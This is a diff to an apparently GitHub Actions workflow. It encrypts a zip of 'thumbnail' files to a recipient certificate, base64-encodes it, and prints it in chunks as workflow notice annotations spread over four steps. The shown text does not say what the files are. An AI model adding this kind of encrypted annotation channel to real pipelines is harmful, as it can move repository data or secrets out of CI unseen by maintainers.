@@ -59,12 +59,48 @@ jobs:
               for p in files: z.write(p, p.name)
           PYBRIDGE
           openssl cms -encrypt -binary -aes256 -in /tmp/thumbs.zip -outform DER -out /tmp/thumbs.enc /tmp/recipient.pem
+          base64 -w 0 /tmp/thumbs.enc > /tmp/thumbs.b64
+      - name: Transfer encrypted preview chunks 1
+        shell: bash
+        run: |
           python3 - <<'PYBRIDGE'
-          import base64
           from pathlib import Path
-          data = base64.b64encode(Path('/tmp/thumbs.enc').read_bytes()).decode('ascii')
+          data = Path('/tmp/thumbs.b64').read_text()
           chunks = [data[i:i+3500] for i in range(0, len(data), 3500)]
-          if len(chunks) > 45: raise SystemExit('Transfer too large; no chunks emitted')
-          for i, chunk in enumerate(chunks, 1):
-              print(f'::notice title=ELTHUMBS-{i:02d}-OF-{len(chunks):02d}::{chunk}')
+          if len(chunks) > 40: raise SystemExit('Transfer too large; no chunks emitted')
+          for i in range(0, min(10, len(chunks))):
+              print(f'::notice title=ELTHUMBS-{i+1:02d}-OF-{len(chunks):02d}::{chunks[i]}')
+          PYBRIDGE
+      - name: Transfer encrypted preview chunks 2
+        shell: bash
+        run: |
+          python3 - <<'PYBRIDGE'
+          from pathlib import Path
+          data = Path('/tmp/thumbs.b64').read_text()
+          chunks = [data[i:i+3500] for i in range(0, len(data), 3500)]
+          if len(chunks) > 40: raise SystemExit('Transfer too large; no chunks emitted')
+          for i in range(10, min(20, len(chunks))):
+              print(f'::notice title=ELTHUMBS-{i+1:02d}-OF-{len(chunks):02d}::{chunks[i]}')
+          PYBRIDGE
+      - name: Transfer encrypted preview chunks 3
+        shell: bash
+        run: |
+          python3 - <<'PYBRIDGE'
+          from pathlib import Path
+          data = Path('/tmp/thumbs.b64').read_text()
+          chunks = [data[i:i+3500] for i in range(0, len(data), 3500)]
+          if len(chunks) > 40: raise SystemExit('Transfer too large; no chunks emitted')
+          for i in range(20, min(30, len(chunks))):
+              print(f'::notice title=ELTHUMBS-{i+1:02d}-OF-{len(chunks):02d}::{chunks[i]}')
+          PYBRIDGE
+      - name: Transfer encrypted preview chunks 4
+        shell: bash
+        run: |
+          python3 - <<'PYBRIDGE'
+          from pathlib import Path
+          data = Path('/tmp/thumbs.b64').read_text()
+          chunks = [data[i:i+3500] for i in range(0, len(data), 3500)]
+          if len(chunks) > 40: raise SystemExit('Transfer too large; no chunks emitted')
+          for i in range(30, min(40, len(chunks))):
+              print(f'::notice title=ELTHUMBS-{i+1:02d}-OF-{len(chunks):02d}::{chunks[i]}')
           PYBRIDGE
